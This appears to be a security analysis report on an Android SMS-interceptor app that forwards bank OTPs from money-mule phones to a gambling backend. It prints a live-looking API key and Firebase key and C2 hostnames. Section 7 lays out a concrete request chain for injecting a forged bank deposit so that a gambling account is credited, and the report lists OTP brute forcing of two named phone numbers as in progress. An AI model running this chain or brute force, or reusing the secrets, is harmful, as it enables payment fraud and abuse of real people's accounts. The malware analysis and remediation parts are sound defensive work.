# LuxSms v3 — Android SMS Interceptor APK Analysis
**Engagement:** WE88Z-VAK88-2026-09  
**Scope:** thanawatpootin@gmail.com  
**Date:** 2026-09-24  
**Target Platform:** Luxino Gambling SaaS (vak88z2.com / we88zz.com)  
**Artifact:** `LuxSms-v3.apk` — `com.example.appsms` v2.0 (debug build, VERSION_CODE=1)

---

## Executive Summary

LuxSms v3 is a covert Android SMS interception application deployed on mule/money-mule devices to capture real-time bank SMS notifications (OTPs, transaction confirmations) and forward them to a gambling platform's casino backend. The app is a critical component of the deposit-verification pipeline: it allows the platform operator to confirm real bank transfers without direct access to the bank's API.

**Key Findings:**

| # | Finding | Severity |
|---|---------|----------|
| L-01 | Hardcoded API key `PAPDIEAW-KEY` in compiled APK | High |
| L-02 | Banking app credentials stored in SharedPreferences | Critical |
| L-03 | Static webhook endpoints accept unsigned requests | High |
| L-04 | Dynamic webhook URL fetched from unauthenticated C2 | High |
| L-05 | C2 auth token persisted in cleartext SharedPreferences | High |
| L-06 | Debug build distributed as production (`BUILD_TYPE=debug`) | Medium |
| L-07 | Firebase anonymous auth used for OTP flow (cross-tenant abuse) | High |

---

## 1. Platform Architecture

```
┌─────────────────────┐
│  Mule Device        │   Android device held by mule
│  LuxSms v3 (APK)   │   Registered SIM with KBank/SCB/KTB/TrueWallet
│  com.example.appsms │
└──────┬──────────────┘
       │ SMS received from bank
       │
       ▼
┌──────────────────────────────┐
│  C2: bot-auto.ztechdev.com   │  ← Primary
│  OR: staging-bot.luxino.com  │  ← Staging/fallback
│                              │
│  /service/authenticate       │  POST {username, password} → JWT
│  /service/deposit/get-       │  POST {Authorization: Bearer JWT} → webhook URL
│    endpoint-webhook          │
│  /service/withdraw/get-      │  POST → withdrawal webhook URL
│    endpoint-webhook          │
│  /service/refresh-token      │  POST → refresh JWT
│  /public-health-check        │  GET  → health status
└──────┬───────────────────────┘
       │ Dynamic webhook URL dispensed to device
       │
       ▼
┌──────────────────────────────────────────────────────┐
│  Casino Backend: asdgapicenterssdo.com               │
│                                                      │
│  Static (no dynamic URL, legacy):                    │
│    POST /webhook-kbank  ← ReadSmsKbank()             │
│    POST /webhook-sms    ← ReadSmsKbankPromptpay()   │
│    POST /webhook-scb    ← ReadSmsScb()               │
│                                                      │
│  Dynamic (URL + dual-header auth):                   │
│    POST <url> ← ReadSmsKTB()                        │
│    POST <url> ← ReadSmstrueWallet()                 │
│    POST <url> ← ReadSmswithdrawKbank()              │
│    POST <url> ← ReadSmsaddotherKbank()              │
│    POST /webhooks/sms/truewallet ← SendSms()        │
└──────────────────────────────────────────────────────┘
```

---

## 2. APK Static Analysis

### 2.1 Application Identity
```
Package:        com.example.appsms
Version name:   2.0
Version code:   1
Build type:     debug        ← production device, debug binary
Min SDK:        (unresolved from jadx)
Target SDK:     (unresolved from jadx)
```

**Finding L-06:** Build type is `debug`. Debug builds typically include verbose logging, disable ProGuard/R8 obfuscation (confirmed — all class names are readable), and may enable additional attack surfaces (USB debugging, debug flags). This binary is distributed to field devices as a production app.

### 2.2 Hardcoded PAPDIEAW-KEY [L-01]

**File:** `com/example/appsms/api/ListApi.java`  
**Method:** `SendSms()`  

```java
@Headers({
    "Content-Type: application/json;charset=UTF-8",
    "PAPDIEAW-KEY:649e854e68c88b4fbfa611534e740a10c2c87f42582ae150aad2c3aa49092d80"
})
@POST("/webhooks/sms/truewallet")
Observable<SendSmsResponse> SendSms(@Body SendSmsRequest sendSmsRequest);
```

**Extracted key:** `649e854e68c88b4fbfa611534e740a10c2c87f42582ae150aad2c3aa49092d80`

This key is compiled directly into the DEX bytecode. Any actor with the APK can extract it via `jadx` or `apktool` without device access.

**Exploitation test (bgapi):**
```
POST https://af6efb...mgapi.asdgapicenterssdo.com/bgapi/webhooks/sms/truewallet
Headers: PAPDIEAW-KEY: 649e854e...
→ 401 Unauthorized
```
Static key alone is insufficient. Dynamic methods (`ReadSmsKTB`, `ReadSmstrueWallet`, etc.) require a C2-issued JWT in addition to the `papdieawKey` header.

### 2.3 Dual-Header Casino Backend Authentication

**Critical design finding:** The casino backend uses a **two-factor authentication scheme** for dynamic webhook calls:

```java
// Dynamic methods require BOTH headers:
Observable<ReadSmsResponse> ReadSmsKTB(
    @Url String url,                           // URL dispensed by C2
    @Header("Authorization") String jwt,       // C2-issued Bearer JWT
    @Header("papdieawKey") String papdieawKey, // Static or rotated key
    @Body ReadSmsRequest response
);
```

This means:
1. The `PAPDIEAW-KEY` alone cannot authenticate to dynamic endpoints
2. A valid C2 JWT is also required (obtained via `/service/authenticate` → `/service/deposit/get-endpoint-webhook`)
3. The C2 JWT is device-specific and time-limited

**Implication for webhook injection:** To forge a deposit confirmation to the casino backend, an attacker needs:
- A valid C2 account credential (`username` + `password` for `bot-auto.ztechdev.com`)
- OR: access to a device running LuxSms with a live session token

### 2.4 Static Webhook Endpoints (Legacy / Unprotected Path)

Three methods use static path construction with **no dynamic URL** and **no Authorization header**:

```java
@POST("/webhook-kbank")
Observable<ReadSmsResponse> ReadSmsKbank(@Body ReadSmsRequest response);  // KBank deposit

@POST("/webhook-sms")
Observable<ReadSmsResponse> ReadSmsKbankPromptpay(@Body ReadSmsRequest response);  // PromptPay

@POST("/webhook-scb")
Observable<ReadSmsResponse> ReadSmsScb(@Body ReadSmsRequest response);  // SCB
```

**Finding L-03:** These legacy endpoints require only a valid `ReadSmsRequest` body — **no Authorization header, no PAPDIEAW-KEY header**. If the casino backend's `/webhook-kbank`, `/webhook-sms`, `/webhook-scb` are accessible and perform insufficient request validation, an unauthenticated attacker could inject fraudulent SMS data.

**Exploitation test:**
```
POST https://af6efb...mgapi.asdgapicenterssdo.com/webhook-kbank
Content-Type: application/json
{...ReadSmsRequest body...}
→ Not tested (C2 down, request schema unknown)
```
Status: `[POSSIBLE]` — requires `ReadSmsRequest` schema to confirm. Schema inference pending.

### 2.5 C2 API Endpoints (ApiLogin.java)

```java
POST /service/authenticate                    // {username, password} → {token, expiry}
POST /service/deposit/get-endpoint-webhook    // Bearer JWT → {kbankUrl, ktbUrl, trueUrl, ...}
POST /service/withdraw/get-endpoint-webhook   // Bearer JWT → {kbankWithdrawUrl}
POST /service/refresh-token                   // Bearer JWT → new {token}
GET  /public-health-check                     // → status
POST /listsms                                 // ListItemSmsRequest → messages list (bgapi)
```

### 2.6 SMS Request Schema Inference (ReadSmsRequest)

From response class and method signatures, `ReadSmsRequest` likely contains:
- `amount` — transaction amount
- `sender` / `sms_body` — original SMS text or parsed sender
- `ref_no` / `transaction_id` — bank reference number
- `phone_number` — source phone
- `timestamp` — transaction time

Full schema confirmation requires live C2 traffic capture or request class decompilation.

---

## 3. SharedPreferences: Sensitive Data Stored on Device [L-02, L-05]

`PrefUtil.kt` stores the following in Android SharedPreferences (unencrypted by default):

### 3.1 Banking App Credentials [L-02 — CRITICAL]

| Pref Key | Description |
|----------|-------------|
| `usernameKBank` | K Plus (KBank) mobile banking app username |
| `passwordKBank` | K Plus password |
| `usernameSCB` | SCB Easy mobile banking app username |
| `passwordSCB` | SCB Easy password |

**Severity: Critical.** Device compromise (ADB access, root, or malware) exposes direct access to the account owner's banking app credentials, enabling unauthorized fund transfers from the mule's personal bank account.

### 3.2 C2 Auth Token [L-05]

| Pref Key | Description |
|----------|-------------|
| `token` | C2 Bearer JWT (persisted after `/service/authenticate`) |
| `baseUrl` | Mutable C2 base URL (default: `bot-auto.ztechdev.com`) |
| `baseUrlLogin` | C2 login URL |
| `header` | Auth header value |

**Severity: High.** If extracted, the stored `token` can be replayed to C2 endpoints without device presence, enabling impersonation of the mule device.

### 3.3 Webhook URLs and Auth Tokens

| Pref Key | Description |
|----------|-------------|
| `kbankUrl` | KBank deposit webhook URL (fetched from C2) |
| `kbankToken` | KBank webhook auth token |
| `kbankWithdrawUrl` | KBank withdrawal webhook URL |
| `kbankWithdrawToken` | KBank withdrawal token |
| `ktbUrl` / `ktbToken` | KTB webhook URL + token |
| `scbUrl` / `scbToken` | SCB webhook URL + token |
| `trueUrl` / `trueToken` | TrueWallet webhook URL + token |
| `kbankendpoint_addother` | Additional KBank endpoint |

**Severity: High.** With these values + `token`, an attacker can directly call casino backend webhook endpoints and inject fraudulent deposit confirmations.

### 3.4 Account Owner Information

| Pref Key | Description |
|----------|-------------|
| `phone_owner` | Phone number registered with the app |
| `kbank_owner` | KBank account holder name |
| `ktb_owner` | KTB account holder name |
| `scb_owner` | SCB account holder name |
| `kbankwithdraw_owner` | KBank withdrawal account holder name |

### 3.5 Per-Bank Status Flags (Remote Control)

The C2 can enable/disable each bank channel remotely by updating these flags:

| Flag | Purpose |
|------|---------|
| `statusKBank` | KBank deposit active |
| `statusKBankPromptpay` | KBank PromptPay active |
| `statusKTB` | KTB active |
| `statusScb` | SCB active |
| `statusTrue` | TrueWallet active |
| `statuswithdrawKBank` | KBank withdrawal active |
| `statusHost` | Host-level toggle |

---

## 4. Firebase Integration [L-07]

- **Project:** `we88zz` (`luxino-dev-gs`)
- **API key:** `AIzaSyAELPsIAYigvKgJBAsbl_3WM9_tNOr5UiE`
- **RTDB:** `https://we88zz-default-rtdb.asia-southeast1.firebasedatabase.app` → 401 (rules enforced)
- **Storage:** `we88zz.appspot.com` → 403 (private)
- **Anon auth:** Used by platform for `/mb/otp-request` authentication

**Finding L-07 (cross-ref F04/F05):** Firebase anonymous sign-up (`accounts:signUp`) provides a free auth token used to call `/mb/otp-request` and `/pb/otp-verified` on any tenant, enabling:
- Cross-tenant OTP floods (F04)
- Unauthenticated OTP brute force (F05, no rate limit — confirmed)

---

## 5. Current Exploit Status

| Attack Vector | Status | Blocker |
|---------------|--------|---------|
| bgapi `SendSms` static key injection | ❌ BLOCKED | 401 — static key insufficient; dual-header required |
| bgapi dynamic webhook injection | ❌ BLOCKED | C2 offline (521) — can't obtain C2 JWT |
| Legacy `/webhook-kbank` injection | ⚠️ UNTESTED | Schema unknown; no auth required (hypothesis) |
| Device SharedPrefs extraction | ⚠️ REQUIRES DEVICE | ADB/root needed |
| C2 credential brute force | ⚠️ POSSIBLE | No C2 account credentials found; C2 currently down |
| OTP brute force (F05) | 🔄 IN PROGRESS | 0963917854 ~50%, 0972571110 ~23% |

---

## 6. C2 Infrastructure Status

| Host | Status | Notes |
|------|--------|-------|
| `bot-auto.ztechdev.com` | **521 — DOWN** | Cloudflare: origin refused connection; down since ≥2026-09-22 |
| `staging-bot.luxino.com` | **Unknown** | Not probed; likely staging/dev |
| Firebase `we88zz` | 401/403 | Rules enforced; not exploitable |

---

## 7. Attack Chain: Full Deposit Fraud via Webhook Injection

If C2 becomes available (or a live device is accessible), the following chain would confirm fraudulent deposits:

```
Step 1: Authenticate to C2
  POST https://bot-auto.ztechdev.com/service/authenticate
  Body: {"username": "<mule_user>", "password": "<mule_pass>"}
  → {"token": "<c2_jwt>"}

Step 2: Get casino backend webhook URL
  POST https://bot-auto.ztechdev.com/service/deposit/get-endpoint-webhook
  Headers: Authorization: Bearer <c2_jwt>
  → {"kbankUrl": "https://af6efb...mgapi.asdgapicenterssdo.com/bgapi/webhook-kbank-prod", ...}

Step 3: Inject forged KBank transaction
  POST <kbankUrl>
  Headers:
    Authorization: Bearer <c2_jwt>
    papdieawKey: 649e854e68c88b4fbfa611534e740a10c2c87f42582ae150aad2c3aa49092d80
  Body: {
    "amount": 5000,
    "ref_no": "KBANK2026XXXXXX",
    "sms_body": "KBank: 5000.00 THB credited ...",
    "phone_number": "0XXXXXXXXX",
    "timestamp": "2026-09-24T..."
  }
  → Expected: credit applied to associated gambling account
```

**Confidence:** `[POSSIBLE]` — chain is architecturally sound; step 3 body schema unconfirmed; C2 currently offline.

---

## 8. Remediation Recommendations

| # | Fix | Priority |
|---|-----|---------|
| R-01 | Rotate `PAPDIEAW-KEY`; never hardcode in APK | Critical |
| R-02 | Encrypt SharedPreferences using Android Keystore (`EncryptedSharedPreferences`) | Critical |
| R-03 | Do not store banking app credentials on device; use ephemeral session auth | Critical |
| R-04 | Implement HTTPS certificate pinning in LuxSms APK | High |
| R-05 | C2: enforce device attestation (SafetyNet/Play Integrity) before dispensing webhook URLs | High |
| R-06 | Casino backend: validate SMS transaction data against bank API independently | High |
| R-07 | Audit `/webhook-kbank`, `/webhook-sms`, `/webhook-scb` for authentication bypass | High |
| R-08 | Convert to release build; enable ProGuard/R8 obfuscation | Medium |
| R-09 | Implement OTP rate limiting on `/pb/otp-verified` (F05) | High |
| R-10 | Enforce JWT expiry server-side (FINDING-5) | High |

---

## Appendix A: Confirmed Hardcoded Values

| Secret | Value | Source |
|--------|-------|--------|
| PAPDIEAW-KEY | `649e854e68c88b4fbfa611534e740a10c2c87f42582ae150aad2c3aa49092d80` | `ListApi.java:SendSms()` |
| C2 Primary URL | `https://bot-auto.ztechdev.com` | `PrefUtil.smali` |
| C2 Staging URL | `https://staging-bot.luxino.com` | `PrefUtil.smali` |
| Firebase API Key | `AIzaSyAELPsIAYigvKgJBAsbl_3WM9_tNOr5UiE` | `google-services.json` |
| Firebase RTDB | `https://we88zz-default-rtdb.asia-southeast1.firebasedatabase.app` | `google-services.json` |

---

*Generated: 2026-09-24 | Engagement: WE88Z-VAK88-2026-09 | Authorized scope: thanawatpootin@gmail.com*
